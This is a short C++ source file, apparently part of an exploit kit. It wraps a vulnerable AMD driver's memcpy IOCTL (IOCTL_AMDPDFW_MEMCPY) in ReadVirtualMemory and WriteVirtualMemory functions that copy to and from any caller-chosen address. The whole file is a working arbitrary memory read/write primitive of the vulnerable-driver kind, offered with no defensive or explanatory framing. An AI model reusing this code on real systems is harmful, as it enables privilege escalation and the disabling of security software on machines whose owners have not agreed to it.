#include "Vuln.h"

namespace Vuln
{
    BOOL WINAPI ReadVirtualMemory(
        _In_ HANDLE DeviceHandle,
        _In_ ULONG_PTR Address,
        _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
        _In_ ULONG NumberOfBytes)
    {
        PDFW_MEMCPY request;

        RtlSecureZeroMemory(&request, sizeof(request));

        request.Destination = Buffer;
        request.Source = (PVOID)Address;
        request.Size = NumberOfBytes;

        DWORD BytesReturned;


        return DeviceIoControl(
            DeviceHandle,
            IOCTL_AMDPDFW_MEMCPY,
            &request,
            sizeof(request),
            &request,
            sizeof(request),
            &BytesReturned, NULL
        );
    }

    BOOL WINAPI WriteVirtualMemory(
        _In_ HANDLE DeviceHandle,
        _In_ ULONG_PTR Address,
        _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
        _In_ ULONG NumberOfBytes)
    {
        PDFW_MEMCPY request;

        RtlSecureZeroMemory(&request, sizeof(request));

        request.Destination = (PVOID)Address;
        request.Source = Buffer;
        request.Size = NumberOfBytes;

        DWORD BytesReturned;

        return DeviceIoControl(
            DeviceHandle,
            IOCTL_AMDPDFW_MEMCPY,
            &request,
            sizeof(request),
            &request,
            sizeof(request),
            &BytesReturned,
            NULL
        );
    }
}